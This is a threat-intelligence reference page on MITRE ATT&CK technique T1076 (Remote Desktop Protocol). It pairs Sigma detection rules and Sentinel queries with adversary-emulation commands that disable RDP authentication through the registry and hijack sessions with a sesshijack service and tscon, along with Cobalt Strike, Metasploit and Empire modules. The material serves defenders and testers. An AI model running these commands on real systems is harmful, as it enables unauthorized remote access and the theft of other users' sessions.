
# Remote Desktop Protocol

## Description

### MITRE Description

> Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)

Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['Remote Desktop Users', 'User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1076

## Potential Commands

```
Enable RDP Services:
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
net start TermService
Enable RDP Services:
shell REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
shell net start TermService
post/windows/manage/enable_rdp
None
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:rdp-tcp#55"
net start sesshijack

Connect-RDP -ComputerName $ENV:logonserver.TrimStart("\") -User #{username}

Connect-RDP -ComputerName #{logonserver} -User $Env:USERDOMAIN\$ENV:USERNAME

mstsc.exe|tscon.exe
powershell/management/enable_multi_rdp
powershell/management/enable_multi_rdp
powershell/management/enable_rdp
powershell/management/enable_rdp
```

## Commands Dataset

```
[{'command': 'Enable RDP Services:\n'
             'REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal '
             'Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD '
             '/d 0 /f\n'
             'reg add '
             '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal '
             'Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f \n'
             'net start TermService',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Enable RDP Services:\n'
             'shell REG ADD '
             '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal '
             'Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD '
             '/d 0 /f\n'
             'shell reg add '
             '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal '
             'Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f \n'
             'shell net start TermService',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'post/windows/manage/enable_rdp',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': None, 'name': None, 'source': 'atomics/T1076/T1076.yaml'},
 {'command': 'query user\n'
             'sc.exe create sesshijack binpath= "cmd.exe /k tscon '
             '#{Session_ID} /dest:rdp-tcp#55"\n'
             'net start sesshijack\n',
  'name': None,
  'source': 'atomics/T1076/T1076.yaml'},
 {'command': 'Connect-RDP -ComputerName $ENV:logonserver.TrimStart("\\") -User '
             '#{username}\n',
  'name': None,
  'source': 'atomics/T1076/T1076.yaml'},
 {'command': 'Connect-RDP -ComputerName #{logonserver} -User '
             '$Env:USERDOMAIN\\$ENV:USERNAME\n',
  'name': None,
  'source': 'atomics/T1076/T1076.yaml'},
 {'command': 'mstsc.exe|tscon.exe',
  'name': None,
  'source': 'SysmonHunter - Remote Desktop Protocol'},
 {'command': 'powershell/management/enable_multi_rdp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/enable_multi_rdp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/enable_rdp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/enable_rdp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Samir Bousseaden',
                  'date': '2019/02/16',
                  'description': 'Detects svchost hosting RDP termsvcs '
                                 'communicating with the loopback address and '
                                 'on TCP port 3389',
                  'detection': {'condition': 'selection',
                                'selection': {'DestinationIp': ['127.*', '::1'],
                                              'EventID': 3,
                                              'Image': '*\\svchost.exe',
                                              'Initiated': 'true',
                                              'SourcePort': 3389}},
                  'falsepositives': ['unknown'],
                  'id': '5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://twitter.com/SBousseaden/status/1096148422984384514'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.command_and_control',
                           'attack.t1076',
                           'car.2013-07-002'],
                  'title': 'RDP over Reverse SSH Tunnel'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'date': '2019/01/28',
                  'description': 'RDP login with localhost source address may '
                                 'be a tunnelled login',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 4624,
                                              'LogonType': 10,
                                              'SourceNetworkAddress': ['::1',
                                                                       '127.0.0.1']}},
                  'falsepositives': ['Unknown'],
                  'id': '51e33403-2a37-4d66-a574-1fda1782cc31',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'modified': '2019/01/29',
                  'references': ['https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html'],
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement',
                           'attack.t1076',
                           'car.2013-07-002'],
                  'title': 'RDP Login from localhost'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'date': '2019/02/16',
                  'description': 'Detects svchost hosting RDP termsvcs '
                                 'communicating with the loopback address and '
                                 'on TCP port 3389',
                  'detection': {'condition': 'selection and ( sourceRDP or '
                                             'destinationRDP )',
                                'destinationRDP': {'DestinationPort': 3389,
                                                   'SourceAddress': ['127.*',
                                                                     '::1']},
                                'selection': {'EventID': 5156},
                                'sourceRDP': {'DestinationAddress': ['127.*',
                                                                     '::1'],
                                              'SourcePort': 3389}},
                  'falsepositives': ['unknown'],
                  'id': '5bed80b6-b3e8-428e-a3ae-d3c757589e41',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://twitter.com/SBousseaden/status/1096148422984384514'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.command_and_control',
                           'attack.t1076',
                           'car.2013-07-002'],
                  'title': 'RDP over Reverse SSH Tunnel WFP'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/03/17',
                  'description': 'Detects a suspicious RDP session redirect '
                                 'using tscon.exe',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '* '
                                                             '/dest:rdp-tcp:*'}},
                  'falsepositives': ['Unknown'],
                  'id': 'f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2018/12/11',
                  'references': ['http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html',
                                 'https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6'],
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement',
                           'attack.privilege_escalation',
                           'attack.t1076',
                           'car.2013-07-002'],
                  'title': 'Suspicious RDP Redirect Using TSCON'}}]
```

## Potential Queries

```json
[{'name': 'Remote Desktop Protocol Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and(process_path contains "tscon.exe"or '
           'process_path contains "mstsc.exe")'},
 {'name': 'Remote Desktop Protocol Registry',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and '
           '(process_path contains "LogonUI.exe"or registry_key_path contains '
           '"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal '
           'Services\\\\")'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Enable '
                                                                              'RDP '
                                                                              'Services:\n'
                                                                              'REG '
                                                                              'ADD '
                                                                              '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal '
                                                                              'Server\\WinStations\\RDP-Tcp" '
                                                                              '/v '
                                                                              'UserAuthentication '
                                                                              '/t '
                                                                              'REG_DWORD '
                                                                              '/d '
                                                                              '0 '
                                                                              '/f\n'
                                                                              'reg '
                                                                              'add '
                                                                              '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal '
                                                                              'Server" '
                                                                              '/v '
                                                                              'fDenyTSConnections '
                                                                              '/t '
                                                                              'REG_DWORD '
                                                                              '/d '
                                                                              '0 '
                                                                              '/f \n'
                                                                              'net '
                                                                              'start '
                                                                              'TermService',
                                                  'Category': 'T1076',
                                                  'Cobalt Strike': 'Enable RDP '
                                                                   'Services:\n'
                                                                   'shell REG '
                                                                   'ADD '
                                                                   '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal '
                                                                   'Server\\WinStations\\RDP-Tcp" '
                                                                   '/v '
                                                                   'UserAuthentication '
                                                                   '/t '
                                                                   'REG_DWORD '
                                                                   '/d 0 /f\n'
                                                                   'shell reg '
                                                                   'add '
                                                                   '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal '
                                                                   'Server" /v '
                                                                   'fDenyTSConnections '
                                                                   '/t '
                                                                   'REG_DWORD '
                                                                   '/d 0 /f \n'
                                                                   'shell net '
                                                                   'start '
                                                                   'TermService',
                                                  'Description': 'Enable RDP '
                                                                 'via the '
                                                                 'registry and '
                                                                 'services',
                                                  'Metasploit': 'post/windows/manage/enable_rdp'}},
 {'Atomic Red Team Test - Remote Desktop Protocol': {'atomic_tests': [{'description': 'RDP '
                                                                                      'hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) '
                                                                                      '- '
                                                                                      'how '
                                                                                      'to '
                                                                                      'hijack '
                                                                                      'RDS '
                                                                                      'and '
                                                                                      'RemoteApp '
                                                                                      'sessions '
                                                                                      'transparently '
                                                                                      'to '
                                                                                      'move '
                                                                                      'through '
                                                                                      'an '
                                                                                      'organization\n',
                                                                       'executor': {'cleanup_command': 'sc.exe '
                                                                                                       'delete '
                                                                                                       'sesshijack '
                                                                                                       '>nul '
                                                                                                       '2>&1\n',
                                                                                    'command': 'query '
                                                                                               'user\n'
                                                                                               'sc.exe '
                                                                                               'create '
                                                                                               'sesshijack '
                                                                                               'binpath= '
                                                                                               '"cmd.exe '
                                                                                               '/k '
                                                                                               'tscon '
                                                                                               '#{Session_ID} '
                                                                                               '/dest:#{Destination_ID}"\n'
                                                                                               'net '
                                                                                               'start '
                                                                                               'sesshijack\n',
                                                                                    'elevation_required': True,
                                                                                    'name': 'command_prompt'},
                                                                       'input_arguments': {'Destination_ID': {'default': 'rdp-tcp#55',
                                                                                                              'description': 'Connect '
                                                                                                                             'the '
                                                                                                                             'session '
                                                                                                                             'of '
                                                                                                                             'another '
                                                                                                                             'user '
                                                                                                                             'to '
                                                                                                                             'a '
                                                                                                                             'different '
                                                                                                                             'session',
                                                                                                              'type': 'String'},
                                                                                           'Session_ID': {'default': 1337,
                                                                                                          'description': 'The '
                                                                                                                         'ID '
                                                                                                                         'of '
                                                                                                                         'the '
                                                                                                                         'session '
                                                                                                                         'to '
                                                                                                                         'which '
                                                                                                                         'you '
                                                                                                                         'want '
                                                                                                                         'to '
                                                                                                                         'connect',
                                                                                                          'type': 'String'}},
                                                                       'name': 'RDP '
                                                                               'hijacking',
                                                                       'supported_platforms': ['windows']},
                                                                      {'dependencies': [{'description': 'Computer '
                                                                                                        'must '
                                                                                                        'be '
                                                                                                        'domain '
                                                                                                        'joined\n',
                                                                                         'get_prereq_command': 'Write-Host '
                                                                                                               'Joining '
                                                                                                               'this '
                                                                                                               'computer '
                                                                                                               'to '
                                                                                                               'a '
                                                                                                               'domain '
                                                                                                               'must '
                                                                                                               'be '
                                                                                                               'done '
                                                                                                               'manually\n',
                                                                                         'prereq_command': 'if((Get-CIMInstance '
                                                                                                           '-Class '
                                                                                                           'Win32_ComputerSystem).PartOfDomain) '
                                                                                                           '{ '
                                                                                                           'exit '
                                                                                                           '0} '
                                                                                                           'else '
                                                                                                           '{ '
                                                                                                           'exit '
                                                                                                           '1}\n'}],
                                                                       'description': 'Attempt '
                                                                                      'an '
                                                                                      'RDP '
                                                                                      'session '
                                                                                      'via '
                                                                                      '"Connect-RDP" '
                                                                                      'to '
                                                                                      'a '
                                                                                      'system. '
                                                                                      'Default '
                                                                                      'RDPs '
                                                                                      'to '
                                                                                      '(%logonserver%) '
                                                                                      'as '
                                                                                      'the '
                                                                                      'current '
                                                                                      'user\n',
                                                                       'executor': {'command': 'Connect-RDP '
                                                                                               '-ComputerName '
                                                                                               '#{logonserver} '
                                                                                               '-User '
                                                                                               '#{username}\n',
                                                                                    'elevation_required': False,
                                                                                    'name': 'powershell'},
                                                                       'input_arguments': {'logonserver': {'default': '$ENV:logonserver.TrimStart("\\")',
                                                                                                           'description': 'ComputerName '
                                                                                                                          'argument '
                                                                                                                          'default '
                                                                                                                          '%logonserver%',
                                                                                                           'type': 'String'},
                                                                                           'username': {'default': '$Env:USERDOMAIN\\$ENV:USERNAME',
                                                                                                        'description': 'Username '
                                                                                                                       'argument '
                                                                                                                       'default '
                                                                                                                       '%USERDOMAIN%\\%username%',
                                                                                                        'type': 'String'}},
                                                                       'name': 'RDPto-DomainController',
                                                                       'supported_platforms': ['windows']}],
                                                     'attack_technique': 'T1076',
                                                     'display_name': 'Remote '
                                                                     'Desktop '
                                                                     'Protocol'}},
 {'SysmonHunter - T1076': {'description': None,
                           'level': 'medium',
                           'name': 'Remote Desktop Protocol',
                           'phase': 'Lateral Movement',
                           'query': [{'process': {'any': {'pattern': 'mstsc.exe|tscon.exe'}},
                                      'type': 'process'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1076',
                                            'ATT&CK Technique #2': 'T1043',
                                            'Concatenate for Python Dictionary': '"powershell/management/enable_multi_rdp":  '
                                                                                 '["T1076","T1043"],',
                                            'Empire Module': 'powershell/management/enable_multi_rdp',
                                            'Technique': 'Remote Desktop '
                                                         'Protocol'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1076',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/enable_rdp":  '
                                                                                 '["T1076"],',
                                            'Empire Module': 'powershell/management/enable_rdp',
                                            'Technique': 'Remote Desktop '
                                                         'Protocol'}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations

None

# Actors


* [Cobalt Group](../actors/Cobalt-Group.md)

* [APT3](../actors/APT3.md)
    
* [APT1](../actors/APT1.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [OilRig](../actors/OilRig.md)
    
* [FIN8](../actors/FIN8.md)
    
* [menuPass](../actors/menuPass.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [FIN10](../actors/FIN10.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [Axiom](../actors/Axiom.md)
    
* [Stolen Pencil](../actors/Stolen-Pencil.md)
    
* [APT39](../actors/APT39.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [APT41](../actors/APT41.md)
    
